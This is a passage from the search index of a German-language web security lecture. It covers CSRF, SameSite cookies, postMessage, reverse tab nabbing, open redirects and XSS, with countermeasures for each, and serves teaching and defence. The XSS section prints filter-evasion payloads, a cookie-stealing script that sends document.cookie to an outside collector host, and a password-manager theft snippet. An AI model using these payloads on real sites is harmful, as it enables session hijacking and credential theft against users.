funktioniert, muss der Zahlenwert regelm\u00e4\u00dfig erneuert werden, bevorzugterweise sollte f\u00fcr jede potentielle Operation ein neuer Zufallswert generiert werden. In der Praxis wird diese Anti-CSRF Ma\u00dfnahme h\u00e4ufig vollkommen transparent und automatisch durch das verwendete Web-Framework implementiert.</p> <p>Wichtig ist, dass eine Operation die einen CSRF-Check implementiert nicht nur \u00fcberpr\u00fcft, ob ein potentiell \u00fcbergebener CSRF-Wert mit dem server-gespeicherten CSRF-Wert \u00fcbereinstimmt, sondern auch \u00fcberpr\u00fcft ob \u00fcberhaupt ein CSRF-Wert \u00fcbergeben wurde. W\u00e4hrend Tests wurde h\u00e4ufig das fehlerhafte Verhalten vorgefunden, dass wenn der CSRF-Parameter einfach gel\u00f6scht wird, die Operation ausgef\u00fchrt wird (also CSRF-Tokens nur verglichen werden, wenn beim Aufruf zumindest ein CSRF-Wert \u00fcbergeben wird).</p>"},{"location":"client-side-attacks/csrf-attacks/#samesite-flag-bei-session-cookies","title":"SameSite-Flag bei Session Cookies","text":"<p>Eine weitere Schutzma\u00dfnahme (im Sinne des Hardening) ist der Einsatz des SameSite Cookie-Flags. Bei korrektem Setzen dieses Flags erlaubt der Web-Browser des Opfers das \u00dcbertragen der Session-Id nur, wenn sowohl das Formular als auch das Ziel des Formulars sich auf dem identen Webserver befinden.</p>"},{"location":"client-side-attacks/postMessage/","title":"HTML5 PostMessage als Angriffskanal","text":"<p>Eine Webapplikation wird innerhalb eines Browser-Tabs ge\u00f6ffnet, ihre Einflussm\u00f6glichkeiten (z.B. mittels Javascript) beschr\u00e4nken sich auf Inhalte innerhalb des Browser-Tabs. Es gibt Use-Cases, bei denen eine Applikation mit einer Webseite innerhalb eines anderen Browser-Tabs bzw. Browser-Fensters interagieren will. Ein Beispiel sind web-basierte Pr\u00e4sentationsframeworks. Hier gibt es meistens zwei Browserfenster: eines f\u00fcr die aktuell dargestellte Pr\u00e4sentationsfolie und ein Fenster mit Notzien f\u00fcr den Vortragenden. Wird die Folie gewechselt sollten im zweiten Fenster ebenso die Kommentare f\u00fcr die aktuell angezeigte Folie dargestellt werden.</p> <p>Eine moderne Implementierungsm\u00f6glichkeit f\u00fcr diese Funktion ist HTML5 postMessage. Die Webseite, welche eine Aktion ausf\u00fchren will, kann eine Nachricht via Javascript absenden. Diese Nachricht beinhaltet die message, einen Target-Origin (kann auch das Wildcard * sein) und eine Liste von serialisierten Objekten (deren Owernship an den Empf\u00e4nger \u00fcbergehen). Die empfangende Webseite kann einen Callback-Handler f\u00fcr empfangene Webseiten registrieren und auf diese Weise auf die Nachricht reagieren.</p> <p>Ein Beispiel f\u00fcr einen Message-Handler:</p> <pre><code>&lt;script&gt;\nfunction messageHandler(event){\n    from = \"From: \" + event.origin;\n    data = \"Data: \" + event.data;\n    alert(from);\n    alert(data)\n}\n// Register the handler\nwindow.addEventListener(\"message\", messageHandler)\n&lt;/script&gt;\n</code></pre> <p>Das Beispiel zeigt bereits eine Schwachstelle von HTML5 postMessage: der origin wird nicht durch den Empf\u00e4nger \u00fcberpr\u00fcft, sondern durch den Code des Empf\u00e4ngers.</p> <p>Wie kann eine Nachricht gesendet werden?</p> <pre><code>otherWindow.postMessage(message, targetOrigin, [transfer])\n</code></pre> <p>Die jeweiligen Variablen w\u00e4ren:</p> <ul> <li> <p>otherWindow gibt den Empf\u00e4nger an. Dieser kann z.B. parent,   ein Iframe, window.opener oderwindow.source sein.</p> </li> <li> <p>message ist der String der als Nachricht an den Empf\u00e4nger   \u00fcbertragen wird.</p> </li> <li> <p>targetOrigin gibt die origin des Empf\u00e4ngers an, kann aber auch   als Wildcard (*) ausgef\u00fchrt sein.</p> </li> <li> <p>tranfer ist eine Liste von \u00fcbertragenen Objekten. Diese k\u00f6nnen   vom Sender nicht mehr verwendet werden und gehen in den Besitz des   Empf\u00e4ngers \u00fcber.</p> </li> </ul> <p>Hier ergeben sich zwei Angriffsszenarien:</p> <ol> <li> <p>Eine Webseite akzeptiert Nachrichten von beliebigen Quellen. Dies    k\u00f6nnte z.B. im Zuge eines XSS-Angriffs ausgenutzt werden.</p> </li> <li> <p>Beim Senden der Nachricht werden sensible Daten versendet ohne dass    der Empf\u00e4nger eingeschr\u00e4nkt wird. Dies geht zumeist mit einer    TargetOrigin von * herein.</p> </li> </ol>"},{"location":"client-side-attacks/reverse-tab-nabbing/","title":"Reverse Tab Nabbing","text":"<p>Bei einem Reverse Tab Nabbing navigiert der Benutzer zuerst auf eine Opferseite. Diese \u00f6ffnet nun einen Link auf eine b\u00f6sartige Seite in einem neuen Fenster. Die aufgerufene b\u00f6sartige Seite verwendet nun Javascript um die Adresse der aufrufenden Seite (die wahrscheinlich gerade im Hintergrund ist) zu ver\u00e4ndern, der Webbrowser f\u00fchrt nun ein redirect auf die neu verlinkte Seite im Hintergrund vor (w\u00e4hrend der Benutzer noch immer die neu ge\u00f6ffnete Seite betrachtet). Wenn der Benutzer nun das ge\u00f6ffnete Fenster schlie\u00dft befindet er sich vermeintlich auf der urspr\u00fcnglichen Seite, welche den Link \u00f6ffnete, befindet sich allerdings in Wirklichkeit auf einer Seite, die vom Angreifer bestimmt wurde.</p> <p>Ein Beispiel f\u00fcr Reverse Tab Nabbing, folgende Opfer Seite:</p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;li&gt;&lt;a href=\"bad.example.com\" target=\"_blank\"&gt;Vulnerable target using html link to open the new page&lt;/a&gt;&lt;/li&gt;\n    &lt;button onclick=\"window.open('https://bad.example.com')\"&gt;Vulnerable target using javascript to open the new page&lt;/button&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Die Opferwebseite \u00f6ffnet eine externe Seite \u00fcber einen Link (mittels target=_blank wird ein neues Fenster ge\u00f6ffnet) bzw. alternativ \u00fcber Javascript (onclick). Als neue Webseite verwendet der Angreifer folgendes:</p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      if (window.opener) {\n        window.opener.location = \"https://phish.example.com\";\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Der Angreifer setzt \u00fcber window.opener die Adresse der aufgerufenen Seite und \u00e4ndert dadurch (im Hintergrund) die im Webbrowser dargestellte Seite. Wenn der Benutzer die ge\u00f6ffnete Seite schlie\u00dft, gelangt er dadurch auf eine vom Angreifer modifizierte Webseite.</p> <p>Als Gegenma\u00dfnahme sollte bei ausgehenden Links immer das rel Attribute auf noopener noreferrer gesetzt werden. Dadurch kann die ge\u00f6ffnete Seite nicht mehr \u00fcber windows.opener auf die Location der \u00f6ffnenden Seite zugreifen. Zus\u00e4tzlich kann \u00fcber die Referrer-Policy das \u00dcbermitteln des Referrer-Headers an die aufgerufene Webseite unterbunden werden.</p> <p>Update 2020: mehrere Browser bieten mittlerweile automatische Verteidigungsmassnahmen gegen\u00fcber Reverse Tabnabbing Angriffe. Firefox (seit 2016), Microsoft Edge und Firefox sollten out-of-the-box nicht mehr gegen\u00fcber diesem Angriff verwundbar sein (sie setzen das noopener-Flag automatisch). In zuk\u00fcnftigen Google Chrome Versionen ab 2021 sollte diese Browserfamilie dies auch durchf\u00fchren und auf diese Weise Tabnabbing-Angriffe unterbinden.</p>"},{"location":"client-side-attacks/unverified-redirects/","title":"Unverified Forwards and Redirects","text":"<p>Diese Schwachstelle war in den OWASP Top 10 2013 vorhanden, wurde allerdings 2017 aus der Liste der Top 10 entfernt. Die Schwachstelle entsteht, falls eine Operation einer Webapplikation den Benutzerbrowser auf eine weitere Seite weiterleitet und das Ziel \u00fcber einen Parameter bestimmt wird. Ein Angreifer kann nun versuchen, das Opfer auf eine externe Seite zu leiten um dies im Zuge eines Social Engineering Angriffs auszunutzen. Eine verwundbare Operation w\u00fcrde z.B. folgenderma\u00dfen aussehen: <code>http://example.com/example.php?url=http://malicious.example.com</code>.</p> <p>Besonders gef\u00e4hrlich ist es, wenn die verlinkte URL nicht \u00fcber ein HTTP Redirect aufgerufen wird, sondern wenn die \u00fcbergebene URL als Ziel eines eingebetteten IFrames verwendet wird. Auf diese Weise kann der Angreifer Inhalte auf der (vermeintlichen) Opferwebseite platzieren, die meisten Enduser werden nicht bemerken, dass sie gerade Daten in einem Iframe und nicht in der Opfer-Webseite eingeben.</p> <p>Falls es wirklich notwendig sein sollte, dass eine Zieladresse \u00fcber einen URL-Parameter \u00fcbergeben wird, sollte penibles Whitelisting der erlaubten URLs betrieben werden.</p>"},{"location":"client-side-attacks/xss/","title":"JavaScript-Injections (XSS)","text":"<p>Javascript-Injections (Cross-Site Scripting XSS) sind ein sehr h\u00e4ufig genutzter Angriffsvektor. Aufgrund der H\u00e4ufigkeit dieses Angriffsvektor sind f\u00fcr diesen auch mehrere Hardening-Ma\u00dfnahmen verf\u00fcgbar.</p> <p>Prinzipiell findet bei diesem Angriffsvektor der Angreifer einen Weg um JavaScript-Code innerhalb einer Webseite zu platzieren. Wird diese Webseite nun von einem Opfer in dessen Browser angezeigt, wird dieser Code exekutiert und der Angreifer kann auf diese Wiese unvorhergesehenen Code exekutieren.</p> <p>Ein einfaches Beispiel w\u00e4re innerhalb der Kommentarfunktion einer Webseite m\u00f6glich. Im Normalfall kann hier ein Benutzer Text eingeben, z.B. \u201cHallo\u201d, und dies wird f\u00fcr alle anderen Benutzer als Teil der HTML-Seite ausgegeben. Das resultierende HTML-Fragment k\u00f6nnte z.B. so aussehen:</p> <pre><code>&lt;div class=\"comment\"&gt;\n    &lt;div class=\"author\"&gt;Andreas Happe&lt;/div&gt;\n    &lt;div class=\"content\"&gt;Hallo&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <p>Ein Angreifer w\u00fcrde nun versuchen, JavaScript-Code als Eingabe zu \u00fcbergeben, in der Hoffnung, dass dieser Code ungefiltert in der HTML-Ausgabe \u00fcbernommen wird. Betrachtet ein anderer Benutzer nun diese Seite, w\u00fcrde dieser JavaScript-Code im Browser des anderen Benutzers ausgef\u00fchrt werden. Ein einfaches Beispiel hierf\u00fcr w\u00e4re die Eingabe von &lt;script&gt;alert(1);&lt;/script&gt;. Dieses JavaScript-Fragment ist relativ harmlos und \u00f6ffnet nur ein Browser-Popup mit dem Text \u201c1\u201d. Der resultierende HTML-Code (der im Browser des Opfers angezeigt werden w\u00fcrde) w\u00e4re:</p> <pre><code>&lt;div class=\"comment\"&gt;\n    &lt;div class=\"author\"&gt;Andreas Happe&lt;/div&gt;\n    &lt;div class=\"content\"&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <p>Ein Problem bei der defensiven Identifikation von potentiellen XSS-L\u00fccken ist, dass die XSS-Angriffsfl\u00e4che immens ist. Fast jede m\u00f6gliche Benutzereingabe kann XSS-Schadmuster beinhalten. Ein Beispiel daf\u00fcr w\u00e4re ein XSS-Fehler innerhalb von Flickr. Hier konnten Hacker XSS-Schadcode in den Metadaten der hochgeladenen JPEGs integrieren (z.B. als Kameramodel). Diese Daten wurden von Flickr ausgelesen, auf der Homepage ausgegeben und dadurch anderen Benutzern als Schadcode \u201cuntergejubelt\u201d. Ein weiteres Beispiel f\u00fcr unerwartete XSS-Angriffsvektoren ist dieses Dokument. Auf Anfrage hin habe ich eine eBook-Version dieses Dokuments erstellt und auf Amazon Kindle Direct Publishing hochgeladen. In der Entwurfsansicht wurden dann mehrere Hundert Rechtschreibfehler bem\u00e4ngelt. Wenn nun allerdings in der Detailansicht die Rechtschreibfehler betrachtet wurden, wurden automatisch XSS-Fragmente aus dem Dokument als Teil der Weboberfl\u00e4che ausgef\u00fchrt und hatten teilweise Zugriff auf Amazon-Cookies, etc.</p>"},{"location":"client-side-attacks/xss/#arten-von-xss-angriffen","title":"Arten von XSS-Angriffen","text":"<p>XSS-Angriffe werden in drei grobe Familien eingeteilt:</p> <p>Reflected XSS: hier wird kein XSS-Code am Server persistiert sondern vom Server an den Client zur\u00fcck reflektiert. Dies wird meistens durch das Einschleusen von JavaScript-Code \u00fcber einen HTTP Parameter erf\u00fcllt \u2014 dies impliziert allerdings auch, dass der Angreifer einen Weg findet, das Opfer zum Aufruf der modifizierten URL zu bewegen. Beispiel einer modifizierten URL: <code>http://opfer.xyz/operation?parameter=&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p> <p>Stored/Persistent XSS: hier besitzt der Angreifer die M\u00f6glichkeit den Javascript-Code am Server zu persistieren, ihn z.B. als Datenbank-Inhalt oder \u00fcber eine hochgeladene Datei zuzustellen. Das Opfer betrachtet nun eine Webseite und bekommt durch den Server das XSS-Fragment \u00fcbertragen. Ein Beispiel w\u00e4re das \u00dcbertragen von <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> als Chatnachricht innerhalb einer Webseite.</p> <p>DOM-based XSS: dieser Angriffsvektor betrifft vor allem client-seitige Javascript-Frameworks die Eingaben aus dem DOM[1] des Browsers \u00fcbernehmen. Der Angreifer versucht, Schadcode innerhalb des DOMs zu platzieren (z.B. \u00fcber die verwendete URL) und hofft, dass die Webapplikation dieses Element zum Bau einer Webseite verwendet. Bei dieser Form des XSS wird der b\u00f6sartige Javascript Code erst im Client gebaut.</p> <p>mXSS: Webbrowser erlauben es, \u00fcber eine Stringzuweisung in das innerHTML-Attribute HTML-Code zu erstellen. Bevor der \u00fcbergebene String in HTML-Code verwandelt wird, wenden die unterschiedlichen Browser-Familien Optimierungen (Mutationen) auf den String an. Dies kann ein Angreifer ausnutzen, indem er Schadcode so formatiert, dass er innerhalb des Strings noch harmlos wirkt, aber nach der String-Mutation b\u00f6sartig wird.</p> <p>uXSS: Universal XSS zielen auf Fehler innerhalb von Webbrowsern bzw. innerhalb von Webbrowserplugin ab. Da diese auf ein Client-Programm abzielen, sind sie f\u00fcr diese Vorlesung out-of-scope.</p> <p>Ein Problem an XSS-Angriffsmustern ist, dass diese sehr stark variieren k\u00f6nnen und daher schwer zu filtern sind; anbei mehrere XSS-Muster:</p> <pre><code>&lt;script&gt;alert(1);&lt;/script&gt;\n&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;\n\n&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;\n&lt;IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`&gt;\n\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n\n&lt;IMG SRC= onmouseover=\"alert('xxs')\"&gt;\n&lt;IMG SRC=\"jav    ascript:alert('XSS');\"&gt;\n&lt;BGSOUND SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"&gt;\n</code></pre> <p>Eine gute Quelle f\u00fcr weitere XSS-Beispiele ist das OWASP XSS Filter Evasion Cheat Sheet.</p>"},{"location":"client-side-attacks/xss/#xss-payloads","title":"XSS-Payloads","text":"<p>Mittels des eingeschleusten JavaScript-Code versucht der Angreifer nun, negativen Einfluss auf einen Benutzer zu nehmen.</p>"},{"location":"client-side-attacks/xss/#session-hijacking","title":"Session Hijacking","text":"<p>Javascript wird innerhalb des Browsers ausgef\u00fchrt. Da in diesem auch zumeist das Session-Cookie zur Identifikation eines Benutzers gegne\u00fcber dem Server gespeichert wird, ist das Stehlen dieses via XSS naheliegend.</p> <p>Um dies zu bewerkstelligen, verwendet der Angreifer einen \u00f6ffentlich-erreichbaren Webserver zu welchem die Cookies (und damit die Benutzeridentit\u00e4ten) \u00fcbermittelt werden sollen. In dem Bespiel wird https://offensive.one/cookie_catcher f\u00fcr diesen Zweck verwendet.</p> <p>Findet der Angreifer auf der Opferwebseite eine persistent-XSS M\u00f6glichkeit, k\u00f6nnte er nun folgendes Javascript-Fragement als XSS-Payload verwenden:</p> <pre><code>&lt;script&gt;\n    document.location=\"https://offensive.one/cookie_catcher?c=\"+document.cookie;\n&lt;/script&gt;\n</code></pre> <p>Der Webbrowser w\u00fcrde also zu einer neuen URL auf dem Angreifer-Server navigiert werden. Ein Teil der URl ist der Parameter ,,c\u201d, dieser Parameter wird mit den aktuellen Cookies bef\u00fcllt. In diesen ist auch das Session-Cookie enthalten. Der Angreifer w\u00fcrde dieses nun aus den Log-Dateien seines Servers auslesen, und Zugriffe auf den urspr\u00fcnglichen Server mit diesem Cookie mit der Identit\u00e4t des Opfers ausf\u00fchren k\u00f6nnen.</p> <p>Als Gegenmassnahme f\u00fcr diese Payload sollte insbesondere das httpOnly-Flag bei Cookies genannt werden. Durch dieses Flag wird der Zugriff via Javascript auf das damit konfigurierte Cookie unterbunden.</p>"},{"location":"client-side-attacks/xss/#virtual-defacement","title":"Virtual Defacement","text":"<p>Ein weiteres Beispiel w\u00e4re Virtual Defacement: bei diesem wird mittels JavaScript die dargestellt Webseite ver\u00e4ndert und dadurch ein Defacement durchgef\u00fchrt. B\u00f6sartig an diesem ist, dass die direkten Inhalte (Webseiten im Filesystem des Webservers) weiterhin korrekt aussehen.</p> <p>Ein Beispiel w\u00e4re folgende Opferwebseite:</p> <pre><code>&lt;html&gt;\n    &lt;head&gt;..\n        &lt;script src=\"http://cdn.local/script.js\"&gt;&lt;/script&gt;\n    &lt;/head&gt;\n    &lt;body id=\"main\"&gt;\n        &lt;h1&gt;My Company&lt;/h1&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>In diesem konkrete Beispiel wird Javascript von einem Content Delivery Network geladen, liegt also nicht lokal am Opfer-Webserver vor. Ein Angreifer w\u00fcrde nun den CDN-Server hacken und das <code>script.js</code>-File ersetzen:</p> <pre><code>document.getElementById(\"main\").innerHTML = \"My Company sucks\";\n</code></pre> <p>In diesem Fall wird der Inhalt des Elements ,,main\u201d ersetzt und schlu\u00dfendlich so die Opfer-Webseite defaced.</p>"},{"location":"client-side-attacks/xss/#social-engineering","title":"Social Engineering","text":"<p>XSS kann auch als Teil von Social-Engineering Angriffen verwendet werden. Ein Besipiel hierf\u00fcr w\u00e4re das BeEF-Framework. Bei diesem wird \u00fcber Javascript ein Client-Handler im Browser installiert. Hierf\u00fcr k\u00f6nnte z. B. eine XSS-L\u00fccke missbraucht werden. \u00dcber diesen Handler k\u00f6nnen mehrere Attacken gestartet werden, unter anderem:</p> <ul> <li> <p>Anzeigen eines Fake Software muss aktualisiert werden-Fenster \u00fcber   dies der Benutzer zum Update eines Browser-Plugins ermuntert wird.   Hierbei wird allerdings kein Browserplugin upgedatet, sondern eine   vom Angreifer bereitgestelle ausf\u00fchrbare Datei exekutiert.</p> </li> <li> <p>Anzeigen eines Assistenten, z. B. ,,Clippy\u201d. Auf diese Weise kann   ein vorgesehener interaktiver Chat emuliert, und dem Kunden   Informationen entlockt werden.</p> </li> <li> <p>BeEF bietet auch Angriffe, welche nicht direkt im Social-Engineering   verankert sind. Beispiele hierf\u00fcr w\u00e4ren z.B. Browser-Exploits,   Information Gathering, Network Tunneling \u00fcber Javascript.</p> </li> </ul>"},{"location":"client-side-attacks/xss/#zusatzliche-angreifersoftware","title":"Zus\u00e4tzliche Angreifersoftware","text":"<p>In den letzten Jahren wurden XSS-Injections auch f\u00fcr Bitcoin/Crypto-Mining missbraucht. In diesem Fall wird beim Besuch der Webseite ein Crypto-Miner im Browser des Benutzers verankert und zum Mining verwendet. Dieses Konzept wird mittlerweile auch als Entsch\u00e4digungsmodel f\u00fcr Webseitenautoren verwendet.</p> <p>XSS kann auch verwendet werden, um den Browser des Opfers Teil eines DDoS-Botnets zu machen. Ein ber\u00fchmtes Beispiel hierf\u00fcr ist die LOIC (Low-Orbit Ion Canon) die z.B. auch gerne von Anonymous verwendet wurde.</p>"},{"location":"client-side-attacks/xss/#stehlen-von-daten-aus-einem-passwortmanager","title":"Stehlen von Daten aus einem Passwortmanager","text":"<p>Die meisten modernen Webbrowser bieten eine Form eines Passwortmanagers an. Nach einem durchgef\u00fchrtem Login werden bei einem erneuten Besuch der Seite die Login-Credentials automatisch vom Webbrowser in das Formular eingetragen.</p> <p>Falls ein Angreifer eine XSS-L\u00fccke innerhalb eines Login-Formulars findet, kann er diese ausnutzen um die Login-Daten zu stehlen:</p> <pre><code>&lt;script&gt;\ndocument.write('&lt;form&gt;&lt;input id=password type=password style=visibility:hidden&gt;&lt;/form&gt;');\nsetTimeout('alert(\"Password: \" + document.getElementById(\"password\").value)', 100);\n&lt;/script&gt;\n</code></pre>"},{"location":"client-side-attacks/xss/#dom-based-xss-angriffe","title":"DOM-based XSS-Angriffe","text":"<p>Bei DOM-based XSS wird das DOM innerhalb des Browsers modifiziert. Da der Angriff innerhalb des Browsers geschieht, besitzt der Webserver keine M\u00f6glichkeit diese Angriffe zu erkennen oder sogar zu verhindern.</p> <p>Ein primitives Beispiel f\u00fcr eine \u00fcber DOM-based XSS verwundbare Webseite (<code>seite.html</code>):</p> <pre><code>&lt;html&gt;\n    &lt;head&gt;..&lt;/head&gt;\n    &lt;body&gt;\n        &lt;script&gt;\n            document.write(\"&lt;b&gt;URL: \" + document.baseURI + \"&lt;/b&gt;\");\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Bei dieser Seite wird die aktuelle URL via Javascript ausgelesen (\u00fcber document.baseURI) und dynamisch in die Webseite eingef\u00fcgt. Wird diese Seite z.B. als <code>seite.html</code> aufgerufen w\u00fcrde URL: seite.html ausgegeben werden. Dies geschieht im Browser des Opfers, keine Serveroperation wird dabei involviert.</p> <p>Ein Angreifer k\u00f6nnte diese Seite ausnutzen und z.B. \u00fcber <code>seite.html&amp;&lt;script&gt;alert(1)&lt;/script&gt;</code> aufrufen. Auf diese Weise wird wieder die URL in das Dokument eingebaut, dabei wird allerdings auch der neue Script-Tag (welcher in der URL mit\u00fcbergeben wurde) eingebaut, un dder Browser exekutiert den Inhalt dieser Script-Tags als Javascript-Code. In diesem Fall wird ein Popup ausgegeben, ein Angreifer k\u00f6nnte nat\u00fcrlich weitere Payloads verwenden.</p> <p>Warum ist diese Angriffsart gef\u00e4hrlich? Ein Angreifer kann ja immerhin nichts am Server modifizieren? Die Antwort liegt im Origin der HTML-Seite. Falls ein Fehler innerhalb einer Webapplikation vorgefunden wird, kann das eingef\u00fchrte Javascript auf alle Resourcen innerhalb des identen Origins zugreifen und so z. B. die verwendeten Session-Cookies mit der Benutzeridentit\u00e4t auslesen. H\u00e4ufig werden DOM-based XSS-Fehler in inkludierten Dokumentationen vorgefunden. Entwickler downloaden z.B. Archive mit Javascript-Bibliotheken, entpacken diese, und inkludieren diese in einem asset oder contrib Verzeichnis. Die entpackten Archive (inkl. dabei vorhandener Dokumentation) werden auf diese Weise vollst\u00e4ndig auf dem Webserver deployed und sind \u00f6ffentlich zugreifbar. Wenn in diesen ein DOM-based XXS Fehler vorhanden ist, kann dieser von Angreifers missbraucht werden. Da beigemengte Dokumentation selten als m\u00f6glicher Angriffsvektor erkannt wird (sie f\u00fchrt ja auch keine direkten serverseitigen Operationen aus), bleiben diese potentiellen Schwachstellen h\u00e4ufig lange unerkannt.</p>"},{"location":"client-side-attacks/xss/#upload-von-htmljavascript-dateien","title":"Upload von HTML/Javascript-Dateien","text":"<p>Falls der Angreifer die M\u00f6glichkeit besitzt Dateien hochzuladen, kann dieser versuchen, auf diese Weise Javascript-Code in der Applikation zu hinterlegen. Hier ist der Angriffsvektor, diese Dateien von einem anderen Benutzer \u00f6ffnen zu lassen. Da die hochgeladenen Dateien innerhalb der Applikation ge\u00f6ffnet werden, erhalten diese Zugriff auf sensible Benutzerdaten wie z.B. Session-Daten.</p> <p>Auch hier sollten die erlaubten Dateitypen durch eine whitelist eingeschr\u00e4nkt werden. Zus\u00e4tzlich sollte der Content-Disposition-Header verwendet werden. Durch diesen teilt der Webserver dem Browser mit, dass eine Datei zum Download bestimmt ist. In diesem Fall l\u00e4dt der Webbrowser die Datei herunter und \u00f6ffnet anschlie\u00dfend potentiell die lokal heruntergeladene Datei \u2014 dadurch ist diese nicht mehr Teil der Webapplikation und kann daher nicht mehr auf z.B. Session-Cookies zugreifen.</p>"},{"location":"client-side-attacks/xss/#x-content-type-options","title":"X-Content-Type-Options","text":"<p>Webserver \u00fcbermitteln den MIME-Datentypen von \u00fcbertragenen Dateien \u00fcber den Content-Type Header. Da diese Header \u201cfr\u00fcher\u201d ab und zu falsch gesetzt wurden, verwenden einige Browser (prim\u00e4r verschiedene Microsoft Internet Explorer und Edge Versionen) eine Heuristik um dynamisch den Content-Type zu bestimmen. Dabei wird der Anfang einer Datei gelesen, engl. \u201csniffing\u201d, und basierend auf der gefundenen Struktur ein MIME-Typ zugeordnet.</p> <p>Dies kann ein Angreifer missbrauchen indem er z.B. ein Textfile hoch l\u00e4dt (Datentyp text/plain). Diese Datei enth\u00e4lt HTML-Code inklusive b\u00f6sartigem JavaScript. Wenn nun ein Opfer auf dieses File zugreift und dessen Browser eine Heuristik verwendet, w\u00fcrde der Dateityp als JavaScript erkannt, und vom Browser das inkludierte b\u00f6sartige JavaScript ausgef\u00fchrt werden. Auf diese Weise kann der Angreifer eine potentielle Javascript-Upload-Sperre umgehen.</p> <p>Mittels des X-Content-Type-Options: nosniff-Headers kann der Webserver dem Webbrowser mitteilen, dass kein sniffing durchgef\u00fchrt, und dem vom Server \u00fcbermittelten Content-Type vertraut werden kann.</p> <p>Zus\u00e4tzlich blockieren Browser requests auf JavaScript- bzw. CSS-Dateien falls hier nicht der richtige Content-Type gesetzt ist (text/css bzw. javascript).</p>"},{"location":"client-side-attacks/xss/#gegenmanahmen","title":"Gegenma\u00dfnahmen","text":"<p>Gegen\u00fcber XSS-Angriffen werden prinzipiell zwei Gegenma\u00dfnahmen empfohlen: Input Sanitation und Escaping von Ausgaben.</p>"},{"location":"client-side-attacks/xss/#filtern-der-eingaben","title":"Filtern der Eingaben","text":"<p>Werden Daten aus nicht-vertrauensw\u00fcrdigen Quellen verwendet, m\u00fcssen diese automatisiert auf Schadmuster hin \u00fcberpr\u00fcft werden. Achtung: jegliche Form von Daten, die durch einen Benutzer bereitgestellt werden, sind automatisch nicht-vertrauensw\u00fcrdige Daten. Ebenso muss beachtet werden, dass dies auch f\u00fcr Daten aus Benutzerhand gilt, die indirekt \u00fcber eine Datenbank ausgelesen werden.</p> <p>Da es eine Vielzahl m\u00f6glicher Schadcodevarianten als auch viele potentielle Tarnmethoden gibt, ist das Filtern von Schadcode effektiv nur durch Verwendung einer (extern) gewarteten Bibliothek m\u00f6glich.</p> <p>Eine weiter M\u00f6glichkeit ist die Verwendung einer Web-Application Firewall wie z.B. mod_security im Zusammenspiel mit dem OWASP Core Rule Set (2). Hierbei wird jeder eingehende HTTP Request auf Schadcode hin \u00fcberpr\u00fcft und ggf. der Schadcode gefiltert bzw. der gesamte Request verworfen. Ein Problem bei der Verwendung von WAFs ist deren Ressourcen-Verbrauch als auch die potentiell hohe Anzahl von False-Positives (Anfragen die zwar nicht b\u00f6sartig sind, aber von der WAF als b\u00f6sartig erkannt, und daher geblockt werden).</p>"},{"location":"client-side-attacks/xss/#quoting-wahrend-der-ausgabe","title":"Quoting w\u00e4hrend der Ausgabe","text":"<p>Um einen XSS-Angriff erfolgreich durchzuf\u00fchren, muss der Javascript-Schadcode im Webbrowser des Opfers ausgef\u00fchrt werden. Um dies bewerkstelligen zu k\u00f6nnen, muss eine b\u00f6sartige Benutzereingabe Teil der dargestellten Webseite werden. Eine weitere Gegenma\u00dfnahme gegen\u00fcber ist es daher, Benutzereingaben vor der Ausgabe so zu maskieren/quoten, dass diese nicht als Schadcode ausgef\u00fchrt werden k\u00f6nnen. Dies wird h\u00e4ufig automatisiert durch Frameworks bzw. Bibliotheken durchgef\u00fchrt.</p> <p>Ein Problem dabei ist, dass die b\u00f6sartige Benutzereingabe in Abh\u00e4ngigkeit der Verwendung unterschiedliche gequotet werden muss. Wird eine Eingabe als Teil einer URL verwendet, muss diese URL gequotete werden; wird eine Eingabe Teil von HTML muss diese HTML-gequoted werden. Wird eine Eingabe serverseitig als Teil von HTML ausgegeben und ist wiederum selbst Teil eines JavaScripts, dann muss die Eingabe sowohl Javascript- als auch HTML-gequotet werden. Eine gute \u00dcbersicht \u00fcber diese Problematik gibt das OWASP XSS Prevention Cheat Sheet. Ein einfaches Beispiel hierf\u00fcr w\u00e4re folgendes serverseitige Source Code Fragment:</p> <pre><code>&lt;script&gt;\nvar x = '&lt;%= taintedVar %&gt;';\nvar d = document.createElement('div');\nd.innerHTML = x;\ndocument.body.appendChild(d);\n&lt;/script&gt;\n</code></pre> <p>Die Variable taintedVar wird hier in einen Javascript-String eingef\u00fcgt (Zeile 2), hierbei muss sie gequoted werden, damit Schadcode nicht den String schlie\u00dfen und b\u00f6sartigen Javascript-Code exekutieren w\u00fcrde. Zus\u00e4tzlich wird die Eingabe zum Wert der Variable x und dieser Wert wird in die HTML Seite eingebaut. Dadurch wird diese Variable als HTML-Code interpretiert und auch auf diese Weise k\u00f6nnte b\u00f6sartiger Code eingebaut werden.</p> <p>Einige Grundregeln zur Verwendung von user-supplied Daten innerhalb von Javascript:</p> <ul> <li> <p>Die Verwendung von Benutzerdaten sollte so weit wie m\u00f6glich   minimiert werden.</p> </li> <li> <p>User-Supplied Daten sollten niemals auf der linken Seite (LHS) einer   Zuweisung verwendet werden.</p> </li> <li> <p>die Methoden element.write und element.writeln als auch die   Attribute innerHTML und outerHTML rendern die \u00fcbergebenen Texte   als HTML-Code. Dabei kann auch Code exekutiert werden \u2014 es wird   empfohlen stattdessen innerText und textContent zu verwenden.</p> </li> <li> <p>die Methode eval sollte vermieden werden. Achtung: teilweise wird   eval intern verwendet (z.B. bei Verwendung von Timeout-Funktionen),   hier sollten keine Benutzereingaben verwendet werden.</p> </li> <li> <p>Ebenso sollte niemals user-supplied Data als Event-Handler verwendet   